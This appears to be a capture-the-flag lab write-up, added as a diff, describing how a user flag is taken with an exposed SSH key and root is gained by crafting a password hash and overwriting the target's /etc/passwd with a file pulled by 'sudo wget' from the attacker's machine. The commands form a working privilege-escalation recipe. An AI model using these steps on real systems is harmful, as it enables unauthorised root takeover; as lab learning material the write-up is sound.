@@ -1,0 +1,53 @@
+IP = 10.10.189.24
+
+
+#1 	User flag
+
+First we use gobuster and the common.txt dictionary
+
+and we found .ssh , inside got rsa file but its not password secured so we can use the RSA_ID to login
+
+jessie(name is found at the webiste source code)@10.10.189.24
+
+ssh -i jessieRSA.txt jessie@10.10.189.24
+
+then we are in the system 
+
+then we cd /home/jessie and found her password
+
+
+
+
+
+
+
+#2 	Root flag
+
+now for root password!!
+
+we better gain access to root rather than get file from root (says John Hammond !)
+
+first we copy target's /etc/passwd  , cat /etc/passwd and copy it into our own machine then
+
+we go python3
+
+import crypt (encryption)
+
+import crypt.crypt("PassswordYouWant")
+
+$6$IQdZxab8T2zYfFd8$8rCJv/qU/v6khPJKZ1FtzGidhhr0s3b/oMBtMqyHNYnDJkot.y5cjr93NW4AxyK5wR0jNF8JcL00jh5LJG/2L.
+
+then put at root:x(replace the x with this string above) 
+
+then save at your machine as passwd 
+
+then oepn a server on your machine  : python -m SimpleHTTPServer
+
+then go target machine and get the passwd from me : sudo wget 10.9.23.248(ur machine ip):8000(port stated at ur machine  python -m simple)/passwd(the file i wanna put at target machine(must be only at ur current directory)) -O /etc/passwd (at where target machine , if not state will be at /dev/shm)
+
+check if ur passwd is done , cat /etc/passwd
+
+then su = switch user to root : su root
+then type password
+
+
